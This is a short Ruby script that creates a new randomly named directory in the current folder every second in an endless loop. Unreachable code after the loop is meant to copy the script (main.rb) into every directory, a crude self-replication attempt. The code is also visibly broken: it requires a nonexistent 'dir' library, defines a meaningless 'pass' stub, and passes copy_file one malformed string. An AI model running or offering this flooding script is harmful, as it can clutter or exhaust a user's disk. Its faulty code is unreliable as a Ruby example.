require "fileutils"
require "os"
require "securerandom"
require "dir"

def pass
end

OS.windows? ? sep = "\\" : sep = "/"  
cwd = FileUtils.pwd()

count = 0

while true
    name = SecureRandom.hex
    sleep(1)
    FileUtils.mkdir("#{cwd}#{sep}#{name}#{count}")
    count += 1
end

if count == 10
    all = Dir.glob('*').select {|f| File.directory? f}
    for dir in all
        if dir == "main.rb"
            pass
        else
            sleep(1)
            FileUtils.copy_file("#{cwd}#{sep}main.rb, #{dir}")
        end
    end
end
